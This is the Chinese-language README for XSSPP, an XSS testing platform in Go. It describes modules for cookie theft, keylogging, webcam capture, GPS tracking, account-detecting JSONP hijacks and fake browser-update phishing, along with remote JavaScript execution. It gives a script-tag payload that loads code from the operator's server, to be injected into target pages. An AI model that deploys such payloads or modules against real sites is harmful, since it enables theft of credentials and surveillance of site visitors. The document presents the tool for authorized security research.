# XSSPP - 跨站脚本攻击测试平台

XSSPP是一个用于安全测试和教育目的的跨站脚本(XSS)攻击测试平台。该平台提供了一套完整的工具，用于模拟、检测和分析XSS漏洞，帮助安全研究人员和开发者更好地理解和防范XSS攻击。

> **免责声明**：本工具仅供安全研究和教育目的使用。使用本工具进行未授权的安全测试是违法的。请在获得明确授权的情况下使用本工具。

## 功能特点

### 多种攻击模块
- **常用工具**：Cookie读取、获取页面信息、表单数据、存储信息、页面截图
- **JSONP劫持**：用户登录检测、百度账号检测、QQ账号检测、微博账号检测、淘宝账号检测、京东账号检测
- **信息收集**：公网IP获取、内网IP获取、摄像头拍照、GPS定位获取、百度身份获取、键盘记录
- **钓鱼攻击**：登录钓鱼、通知钓鱼、Flash更新钓鱼、Chrome浏览器更新钓鱼

### 管理功能
- 实时监控在线客户端
- 详细的客户端信息（公网IP、操作系统、浏览器等）
- 远程执行JavaScript代码
- 查看执行结果
- 截图和摄像头照片保存

## 技术架构

- **后端**：Go语言开发，使用gorilla/websocket实现WebSocket通信
- **前端**：纯JavaScript，无需框架依赖
- **通信**：基于WebSocket的实时双向通信
- **存储**：本地文件系统存储图片和配置

## 安装指南

### 前提条件
- Go 1.16+
- 支持WebSocket的现代浏览器

### 安装步骤

1. 克隆仓库
```bash
git clone https://github.com/yourusername/xsspp.git
cd xsspp
```

2. 安装依赖
```bash
go mod download
```

3. 配置平台
编辑`config.json`文件，设置服务器地址、端口、认证信息等：
```json
{
  "server": {
    "host": "0.0.0.0",
    "port": 8080,
    "baseUrl": "http://localhost:8080"
  },
  "auth": {
    "username": "admin",
    "password": "password",
    "sessionCookieName": "xss_session",
    "sessionValue": "your_secure_session_value"
  },
  "paths": {
    "static": "./static",
    "images": "./images"
  },
  "websocket": {
    "allowCrossOrigin": true
  }
}
```

4. 运行平台
```bash
go run main.go
```

5. 访问管理界面
打开浏览器，访问`http://localhost:8080`，使用配置文件中设置的用户名和密码登录。

## 使用指南

### 部署Payload

1. 登录管理界面后，复制提供的Payload代码：
```html
<script src="http://your-server:8080/payload.js"></script>
```

2. 将此代码注入到目标网页中（仅限于您有权测试的网页）。

### 管理客户端

1. 当目标网页加载Payload后，客户端会自动连接到管理平台。
2. 在管理界面的"在线客户端"部分可以看到所有连接的客户端。
3. 点击"管理"按钮进入客户端详情页面。

### 执行模块

1. 在客户端详情页面，选择要执行的模块。
2. 点击"执行"按钮。
3. 查看执行结果。

### 自定义代码执行

1. 在客户端详情页面，切换到"自定义代码"标签。
2. 输入要执行的JavaScript代码。
3. 点击"执行"按钮。
4. 查看执行结果。

## 安全建议

- 更改默认的用户名和密码
- 使用HTTPS加密通信
- 限制访问IP
- 定期更新平台
- 仅在授权环境中使用

## 项目结构

```
xsspp/
├── config.json          # 配置文件
├── main.go              # 主程序入口
├── modules.json         # 模块配置
├── modules/             # 模块代码
│   ├── cookie.js        # Cookie读取模块
│   ├── screenshot.js    # 截图模块
│   └── ...              # 其他模块
├── static/              # 静态文件
│   ├── client.html      # 客户端管理页面
│   ├── dashboard.html   # 控制台页面
│   ├── login.html       # 登录页面
│   ├── payload.js       # 客户端Payload
│   └── style.css        # 样式文件
└── images/              # 图片存储目录
```

## 贡献指南

欢迎提交Pull Request或Issue来改进这个项目。在提交代码前，请确保：

1. 代码符合Go和JavaScript的编码规范
2. 新功能包含适当的文档
3. 所有测试通过

## 许可证

本项目采用MIT许可证。详见LICENSE文件。

## 致谢

感谢所有为这个项目做出贡献的开发者和安全研究人员。